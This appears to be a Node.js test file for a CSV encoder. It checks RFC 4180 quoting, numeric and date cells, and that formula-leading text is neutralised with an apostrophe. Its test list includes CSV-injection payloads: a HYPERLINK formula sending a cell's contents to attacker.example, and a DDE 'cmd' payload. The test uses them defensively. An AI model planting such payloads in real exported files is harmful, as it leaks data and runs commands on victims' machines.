import assert from "node:assert/strict";
import { test } from "node:test";
import { csvDecimal, csvIsoDate, encodeCsv, encodeCsvCell } from "../src/utils/csv.ts";
import { parseCsv, values } from "./fixtures/rfc4180.mjs";

const BOM = "﻿";
const header = ["Text", "Number"];
function roundTrip(records) {
  const document = encodeCsv(header, records);
  assert(document.startsWith(BOM), "UTF-8 byte order mark");
  assert(document.endsWith("\r\n"), "CRLF after the last record");
  return parseCsv(document.slice(BOM.length));
}

const awkward = [
  "plain",
  "comma, separated",
  'Worker "A"',
  '"fully quoted"',
  "line\r\nbreak",
  "bare\nLF",
  "bare\rCR",
  "trailing\r\n",
  "  leading and trailing spaces  ",
  "café 日本語 مرحبا \u{1F600} é",
  "a=b",
  "1-2",
  "email@example.test",
  "it's",
  "'already quoted",
  "",
];

test("text cells round-trip through a strict RFC 4180 reader", () => {
  const records = roundTrip(awkward.map((text) => [text, csvDecimal(1)]));
  assert.deepEqual(values(records), [header, ...awkward.map((text) => [text, "1.00"])]);
  for (const [text, number] of records.slice(1)) {
    assert.equal(text.quoted, text.value !== "", `non-empty text is always quoted: ${JSON.stringify(text.value)}`);
    assert.equal(number.quoted, false);
  }
});

const formulas = [
  "=1+1",
  "+1+1",
  "-1+1",
  "@SUM(A1:A2)",
  "\t=1+1",
  "\r=1+1",
  "\n=1+1",
  "\tplain tab",
  "＝1+1",
  "＋1",
  "－1",
  "＠SUM(A1)",
  " =1+1",
  " =1+1",
  "​=1+1",
  "\u0001=1+1",
  '=HYPERLINK("http://attacker.example/?d="&A1,"Open")',
  "=cmd|' /C calc'!A0",
  '=1+2";=1+2',
  "=1+2'\" ;,=1+2",
  "-5",
];

test("formula-leading text is neutralised with an apostrophe and otherwise preserved", () => {
  const records = roundTrip(formulas.map((text) => [text, null]));
  assert.deepEqual(values(records).slice(1), formulas.map((text) => [`'${text}`, ""]));
  // OWASP examples, byte for byte.
  assert.equal(encodeCsvCell('=1+2";=1+2'), '"\'=1+2"";=1+2"');
  assert.equal(encodeCsvCell("=1+2'\" ;,=1+2"), '"\'=1+2\'"" ;,=1+2"');
});

test("numeric cells stay bare numbers, including negative values", () => {
  const records = roundTrip([
    ["negative", csvDecimal(-5)],
    ["fraction", csvDecimal(1.5)],
    ["rounded", csvDecimal(0.1 + 0.2)],
    ["zero", csvDecimal(0)],
    ["empty", null],
  ]);
  assert.deepEqual(values(records).slice(1).map(([, number]) => number), ["-5.00", "1.50", "0.30", "0.00", ""]);
  assert(records.slice(1).every(([, number]) => !number.quoted));
  assert.throws(() => csvDecimal(Number.NaN), RangeError);
  assert.throws(() => csvDecimal(Number.POSITIVE_INFINITY), RangeError);
});

test("ISO dates are bare; anything else in a date column is encoded as text", () => {
  const records = roundTrip([
    ["iso", csvIsoDate("2026-04-01")],
    ["legacy", csvIsoDate("=1+1")],
    ["loose", csvIsoDate("2026-4-1")],
  ]);
  assert.deepEqual(values(records).slice(1).map(([, date]) => date), ["2026-04-01", "'=1+1", "2026-4-1"]);
  assert.deepEqual(records.slice(1).map(([, date]) => date.quoted), [false, true, true]);
});

test("records must match the header width", () => {
  assert.throws(() => encodeCsv(header, [["only one"]]), RangeError);
  assert.equal(encodeCsv(header, []), `${BOM}"Text","Number"\r\n`);
});
